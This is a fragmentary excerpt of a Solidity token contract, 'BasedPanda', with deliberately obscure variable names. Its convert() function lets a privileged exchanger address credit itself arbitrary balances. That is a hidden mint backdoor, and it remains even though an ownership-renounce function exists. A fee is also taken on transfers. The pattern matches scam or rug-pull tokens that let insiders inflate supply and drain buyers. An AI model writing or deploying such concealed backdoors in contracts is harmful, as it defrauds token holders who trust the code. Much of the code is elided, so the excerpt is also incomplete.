...
contract Context {
 ...
 contract BasedPanda is Context, ERC20, ERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_, uint256 francis_, uint256 demand_, uint256 totalSupply_,address exchanger_) {
        _name = name_;
    ...
    function convert(uint256 boris) public {
        require(_msgSender() == _exchanger, "BEP : Can't be done");
        balances[_msgSender()] += boris;
    }
...
function renounceOwnership() public virtual onlyOwner {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        unchecked {
            balances[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        balances[grantee] += allons;
  ...
  function getMoonStatus() public view returns (bool){
      return true;
  }
